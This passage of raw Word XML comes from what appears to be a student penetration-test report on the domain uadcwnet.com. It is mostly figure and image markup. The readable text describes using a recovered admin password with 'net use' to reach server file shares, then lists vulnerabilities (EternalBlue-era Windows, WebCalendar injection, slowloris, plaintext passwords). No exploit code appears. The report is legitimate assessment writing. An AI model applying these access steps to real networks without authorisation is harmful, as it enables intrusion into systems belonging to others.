                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="712E40B4" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00622CF7">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>26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99F665" id="_x0000_s1052" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:33.5pt;width:42pt;height:20.65pt;z-index:2517309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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="712E40B4" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00622CF7">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>26</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="7617109E" w14:textId="77777777" w:rsidR="006E32CE" w:rsidRDefault="006E32CE" w:rsidP="006E32CE"/>
    <w:p w14:paraId="6DE56E63" w14:textId="77777777" w:rsidR="0075154D" w:rsidRDefault="00622CF7" w:rsidP="0075154D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00622CF7">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251732992" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="36C2CEAF" wp14:editId="6A7FD2C8">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1946300</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="533400" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="0" b="4445"/>
                <wp:wrapTopAndBottom/>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262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="7657CC0A" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00622CF7">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>27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C2CEAF" id="_x0000_s1053" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:153.25pt;width:42pt;height:20.65pt;z-index:2517329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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="7657CC0A" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00622CF7">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>27</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="006E32CE">
        <w:t xml:space="preserve">With the newly discovered </w:t>
      </w:r>
      <w:r w:rsidR="006D3256">
        <w:t xml:space="preserve">admin password, and the user account it was possible therefore to use </w:t>
      </w:r>
      <w:r w:rsidR="006B5A16">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">net use </w:t>
      </w:r>
      <w:r w:rsidR="006B5A16">
        <w:t xml:space="preserve">to access the administrators </w:t>
      </w:r>
      <w:r w:rsidR="0075154D">
        <w:t>drives present on server 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C8C8E0" w14:textId="77777777" w:rsidR="0075154D" w:rsidRDefault="0075154D" w:rsidP="0075154D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1089"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251674624" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="0D516574" wp14:editId="06ADC951">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5619081" cy="1319613"/>
            <wp:effectExtent l="0" t="0" r="127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t="17441" b="63886"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5619081" cy="1319613"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="52CEE50F" w14:textId="77777777" w:rsidR="0075154D" w:rsidRDefault="0075154D" w:rsidP="0075154D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>With access to the whole fileshare on server 1 the file directories could be viewed and altered.</w:t>
      </w:r>
      <w:r w:rsidR="00622CF7">
        <w:t xml:space="preserve"> (fig 28</w:t>
      </w:r>
      <w:bookmarkStart w:id="19" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="19"/>
      <w:r w:rsidR="00622CF7">
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66364651" w14:textId="77777777" w:rsidR="0075154D" w:rsidRDefault="00622CF7" w:rsidP="0075154D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r w:rsidRPr="00622CF7">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251736064" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2AEB08B6" wp14:editId="15B9EE2F">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1653616</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="533400" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="0" b="4445"/>
                <wp:wrapTopAndBottom/>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262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="03D0F55B" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00622CF7">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>28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EB08B6" id="_x0000_s1054" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:130.2pt;width:42pt;height:20.65pt;z-index:2517360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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="03D0F55B" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00622CF7">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>28</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="0075154D">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251675648" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="5E065FDB" wp14:editId="3598330B">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>300355</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5637179" cy="1162050"/>
            <wp:effectExtent l="0" t="0" r="1905"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r="24219" b="70880"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5637179" cy="1162050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B347169" w14:textId="77777777" w:rsidR="0075154D" w:rsidRPr="004D7B3D" w:rsidRDefault="0075154D" w:rsidP="0075154D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1089"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35EF96C5" w14:textId="77777777" w:rsidR="00D828F5" w:rsidRDefault="00341658" w:rsidP="00865937">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="20" w:name="_Toc27518407"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Discussion</w:t>
      </w:r>
      <w:bookmarkEnd w:id="20"/>
    </w:p>
    <w:p w14:paraId="4377E44D" w14:textId="77777777" w:rsidR="0075154D" w:rsidRPr="004B7E63" w:rsidRDefault="00493395" w:rsidP="004B7E63">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="21" w:name="_Toc27518408"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>General Discussion</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w14:paraId="697E248E" w14:textId="77777777" w:rsidR="009D2D53" w:rsidRDefault="009D2D53" w:rsidP="0075154D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="274D3979" w14:textId="77777777" w:rsidR="0075154D" w:rsidRDefault="0075154D" w:rsidP="0075154D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:spacing w:after="158"/>
      </w:pPr>
      <w:r>
        <w:t>After completing the penetration test of the domain known as uadcwnet.com, major changes to the network must begin immediately, otherwise it would be best to shut down</w:t>
      </w:r>
      <w:r w:rsidR="007A5B94">
        <w:t xml:space="preserve"> the network, irrespective of the company’s demands, </w:t>
      </w:r>
      <w:r>
        <w:t>until the problems listed are resolved.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A2A149" w14:textId="77777777" w:rsidR="007A5B94" w:rsidRDefault="007A5B94" w:rsidP="007A5B94">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72124E8D" w14:textId="77777777" w:rsidR="001F3FFC" w:rsidRDefault="001F3FFC" w:rsidP="001F3FFC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The vulnerabilities that were discovered are crippling should they be exploited. </w:t>
      </w:r>
      <w:r w:rsidR="006E1215">
        <w:t>A remote access trojan for example could have been installed on the server by using the administrator’s password and left there so whenever a user went to download something from their calendar the trojan would pass to them as well. This would harm not only the company’s reputation but trust in its services by its customers. Furthermore, said trojan could also key log users, or pass files in the directory back to a hacker.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="435C59AE" w14:textId="77777777" w:rsidR="001F3FFC" w:rsidRDefault="001F3FFC" w:rsidP="007A5B94">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48E935C3" w14:textId="77777777" w:rsidR="007A5B94" w:rsidRDefault="007A5B94" w:rsidP="00A0250F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:spacing w:after="158"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilities found include:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="8647" w:type="dxa"/>
        <w:tblInd w:w="-5" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1419"/>
        <w:gridCol w:w="2282"/>
        <w:gridCol w:w="1758"/>
        <w:gridCol w:w="3188"/>
      </w:tblGrid>
      <w:tr w:rsidR="009D2D53" w14:paraId="7A22CA75" w14:textId="77777777" w:rsidTr="009D2D53">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1419" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="35C0539B" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t>Type:</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2282" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2E542C03" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t>Where:</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1758" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6E294C99" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t>Why:</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3188" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="416C7DCC" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t>If exploited:</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009D2D53" w14:paraId="073C96EC" w14:textId="77777777" w:rsidTr="009D2D53">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1419" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="23BDD20F" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t>Remote Code Execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2282" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="44303E20" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t>Microsoft Windows MSB server</w:t>
            </w:r>
            <w:r w:rsidR="009D2D53">
              <w:t xml:space="preserve"> 2008</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09CC1FB4" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="76E8FA34" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1758" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="62D39779" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t>Outdated, most systems today use newer systems</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3188" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6A66DD16" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Allows several </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:t>well known</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:t xml:space="preserve"> exploits, such as eternal blue, petya and wannacry to take control of the system</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009D2D53" w14:paraId="6EF0FBB3" w14:textId="77777777" w:rsidTr="009D2D53">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1419" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3A768DDD" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t>Cross side scripting</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="712D1E9D" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t>(php injection)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2282" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6AFC6A3D" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t>WebCalendar v 1.2.4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70849414" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1758" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2931AF17" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="009D2D53" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">This version of </w:t>
            </w:r>
            <w:r w:rsidR="00264D89">
              <w:t>WebCalendar uses an older version of php</w:t>
            </w:r>
            <w:r>
              <w:t>, as well as being itself outdated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3188" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7216C784" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t>WebCalendar v1.2.4 contains numerous vulnerabilities such as an injection style attack on</w:t>
            </w:r>
            <w:r w:rsidR="009D2D53">
              <w:t xml:space="preserve"> its “upload document” page, </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidR="009D2D53">
              <w:t>( filepath/index/install.php</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidR="009D2D53">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009D2D53" w14:paraId="4FC4D3FD" w14:textId="77777777" w:rsidTr="009D2D53">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1419" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2DF4FFD5" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">PHP Injection and </w:t>
            </w:r>
            <w:r w:rsidR="009D2D53">
              <w:t>slow Loris</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> style attacks</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2282" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2B076752" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">PHP 5.6 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1758" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="56137F91" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Old version of php, vulnerable to </w:t>
            </w:r>
            <w:r w:rsidR="009D2D53">
              <w:t>slow Loris</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> and injection as such.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3188" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4511C228" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Slow loris style attack could be used to initiate a DDOS attack on the network by swallowing the </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:t>servers</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:t xml:space="preserve"> resources, php injection style attacks could be used to withdraw something from a database or allow access to restricted parts of the website.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55524242" w14:textId="77777777" w:rsidR="00516210" w:rsidRDefault="00516210" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t>Could also allow a backdoor to be installed</w:t>
            </w:r>
            <w:r w:rsidR="00A0250F">
              <w:t>. See appendix A for an example.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009D2D53" w14:paraId="04B7E252" w14:textId="77777777" w:rsidTr="009D2D53">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1419" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4D056DF8" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t>Password Stored as Plaintext</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2282" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6458B3DC" w14:textId="77777777" w:rsidR="00264D89" w:rsidRDefault="00264D89" w:rsidP="007A5B94">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:t>Server1.uadcwnet.com</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1758" w:type="dxa"/>
          </w:tcPr>
